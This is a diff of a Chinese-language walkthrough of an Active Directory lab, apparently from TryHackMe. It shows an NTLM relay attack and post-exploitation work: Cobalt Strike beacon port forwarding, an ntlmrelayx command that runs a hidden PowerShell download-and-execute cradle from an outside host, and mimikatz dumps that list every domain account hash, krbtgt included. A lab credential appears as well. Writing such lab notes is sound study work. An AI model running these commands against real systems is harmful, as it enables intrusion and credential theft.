@@ -1424,6 +1424,8 @@ PORT     STATE SERVICE
 proxychains xfreerdp /u:watamet /p:'Nothingtoworry!' /v:10.200.114.35 +clipboard
 ```
 
+
+
 拿到foothold
 
 ![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659668437954.jpg)
@@ -1798,11 +1800,226 @@ meterpreter >
 
 ## NTLM Relay
 
-nmap -sT -p 445 -A 10.200.114.0/24
-nmap -sT -p 445 -A 10.200.114.0/24
+1. 获得一个system权限的beacon
+```
+beacon> run whoami
+[*] Tasked beacon to run: whoami
+[+] host called home, sent: 24 bytes
+[+] received output:
+nt authority\system
+
+```
+
+2. 把靶机的445端口转发到kali的445（因为我的CS客户端是在kali开启，所以kali的地址填127.0.0.1）
+```
+beacon> rportfwd 445 127.0.0.1 445
+[+] started reverse port forward on 445 to 127.0.0.1:445
+[*] Tasked beacon to forward port 445 to 127.0.0.1:445
+[+] host called home, sent: 10 bytes
+
+```
 
 
-filesrv01
+3. 开启ntlmrelayx
+```
+proxychains python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t smb://10.200.114.30 -smb2support --no-http-server 
+```
+
+4. 在filesrv01触发NTLM认证
+
+```
+beacon> run dir \\10.200.114.35\blah
+[*] Tasked beacon to run: dir \\10.200.114.35\blah
+[+] host called home, sent: 153 bytes
+[-] could not spawn dir \\10.200.114.35\blah (token): 2
+```
+
+5. 收到NTML认证的哈希流量
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659854255296.png)
+
+看到有Administrator的哈希
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:70017854acf6ea8d2af520eddcc866fb:::
+```
+
+但是这里的哈希试过不能pth，于是我决定换一个方法，当中继发生时执行一条命令，使用```-c```参数,此时我们收到一个system的beacon
+
+```
+proxychains python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t smb://10.200.114.30 -smb2support --no-http-server -c 'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.50.111.108/a\")"'
+```
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659858729357.png)
 
 
-/usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t smb://10.200.114.30 -smb2support -socks 
+拿到root.txt
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1659858952513.png)
+
+**Task 46  NTLM Relay Now you see me, now you don't**
+
+> What host has SMB signing disabled?
+
+> DC-SRV01
+
+
+# 后渗透
+
+使用mimikatz导出sam里的哈希,与我们relay时收到的哈希是一致的
+```
+beacon> mimikatz lsadump::sam
+[*] Tasked beacon to run mimikatz's lsadump::sam command
+[+] host called home, sent: 750702 bytes
+[+] received output:
+Domain : DC-SRV01
+SysKey : 739c5b5f17a8c2bbeb4ddd207a90710e
+Local SID : S-1-5-21-1295596150-3325788684-427610580
+
+SAMKey : 123125e678eaef2f588002dcd3d75067
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 70017854acf6ea8d2af520eddcc866fb
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+```
+
+导出整个域的哈希
+
+```
+beacon> mimikatz lsadump::lsa /patch
+[*] Tasked beacon to run mimikatz's lsadump::lsa /patch command
+[+] host called home, sent: 750702 bytes
+[+] received output:
+Domain : HOLOLIVE / S-1-5-21-471847105-3603022926-1728018720
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   : 
+NTLM : ae19656e1067231cb5e3c5dcea320bba
+
+RID  : 000001f5 (501)
+User : Guest
+LM   : 
+NTLM : 
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   : 
+NTLM : c6bcd5e68903ff375bf859fa045bd8de
+
+RID  : 00000457 (1111)
+User : ad-joiner
+LM   : 
+NTLM : c46a20057362e5dcc1af9678587063aa
+
+RID  : 0000045a (1114)
+User : spooks
+LM   : 
+NTLM : 17ee8530ccb9e99e82a8e5e61892c0f1
+
+RID  : 0000045b (1115)
+User : cryillic
+LM   : 
+NTLM : c75eb9819dcb9628d2abc407b7223b71
+
+RID  : 0000045c (1116)
+User : PC-MGR
+LM   : 
+NTLM : 12187dfef6090b810fcd76fcb3444898
+
+RID  : 0000045f (1119)
+User : SRV-ADMIN
+LM   : 
+NTLM : 4a3ff5120bbadf8f262e230faeb58b14
+
+RID  : 00000462 (1122)
+User : a-koronei
+LM   : 
+NTLM : 4b80bddae540da13e6a656791695457c
+
+RID  : 00000466 (1126)
+User : a-fubukis
+LM   : 
+NTLM : 556ffce954d95427381af02afe1f6587
+
+RID  : 00000467 (1127)
+User : koronei
+LM   : 
+NTLM : 1f3fd340240e4fd6d9cb489f27bfe49c
+
+RID  : 00000468 (1128)
+User : fubukis
+LM   : 
+NTLM : 723ac46f6bee2af009a8404485ef4aa8
+
+RID  : 00000469 (1129)
+User : matsurin
+LM   : 
+NTLM : cabfd4107a3bcdcb28f19b3449d9cf8a
+
+RID  : 0000046a (1130)
+User : mikos
+LM   : 
+NTLM : 320f3f40650fe8a46467ff259c310b67
+
+RID  : 0000046b (1131)
+User : okayun
+LM   : 
+NTLM : 470f765db33733309ea2e3919f327157
+
+RID  : 0000046c (1132)
+User : watamet
+LM   : 
+NTLM : d8d41e6cf762a8c77776a1843d4141c9
+
+RID  : 0000046d (1133)
+User : gurag
+LM   : 
+NTLM : 977f190bc133ce7397e7c48bd3295d9a
+
+RID  : 0000046e (1134)
+User : cocok
+LM   : 
+NTLM : 58c50535f91eb6762364a2ba007125bb
+
+RID  : 0000046f (1135)
+User : ameliaw
+LM   : 
+NTLM : a14a97d351ede243ac6bc576251e7786
+
+RID  : 00000470 (1136)
+User : WEB-MGR
+LM   : 
+NTLM : 0bb6e5639d87631dde65a959c193261f
+
+RID  : 000003f0 (1008)
+User : DC-SRV01$
+LM   : 
+NTLM : 7a70d7a4cbf7c4397ad9181414f582d9
+
+RID  : 00000458 (1112)
+User : S-SRV01$
+LM   : 
+NTLM : 3179c8ec65934b8d33ac9ec2a9d93400
+
+RID  : 00000460 (1120)
+User : PC-FILESRV01$
+LM   : 
+NTLM : eaf7acaf65e52060758676bc474cbc65
+
+RID  : 00000472 (1138)
+User : S-SRV02$
+LM   : 
+NTLM : 706a4bddf43649c6721356b220167083v
+```
+
